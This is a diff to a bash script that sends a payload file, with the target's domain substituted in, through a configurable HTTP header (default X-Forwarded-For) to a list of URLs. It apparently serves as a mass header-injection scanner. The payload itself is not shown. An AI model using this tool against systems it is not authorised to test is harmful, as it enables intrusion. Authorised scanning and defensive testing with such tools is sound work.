@@ -25,8 +25,15 @@ function checkRequirements() {
  
 # Environment
 function defineEnv() {
-  
+  export HEADER_DEFAULT="X-Forwarded-For";
+  export HEADER_DESCRIPTION="The header to use to inject the payload";
+  if    [ "${HEADER+1}" != "1" ] \
+     || [ "x${HEADER}" == "x" ]; then
+    export HEADER="${HEADER_DEFAULT}";
+  fi
+
   ENV_VARIABLES=(\
+    HEADER \
   );
  
   export ENV_VARIABLES;
@@ -109,10 +116,11 @@ function checkInput() {
 function main() {
 
   local _payload="$(cat "${PAYLOAD_FILE}")"
-
+  local _domain;
   while read _url; do
+    _domain="$(echo ${_url} | cut -d'/' -f3)";
     logInfo -n "Accessing ${_url}";
-    curl -H "X-Forwarded-For: ${_payload}" "${_url}" -o /dev/null > /dev/null 2>&1
+    curl -H "${HEADER}: $(cat ${PAYLOAD_FILE} | sed "s/\${DOMAIN}/${_domain}/g")" "${_url}" -o /dev/null > /dev/null 2>&1
     if [ $? -eq 0 ]; then
       logInfoResult SUCCESS "done";
     else
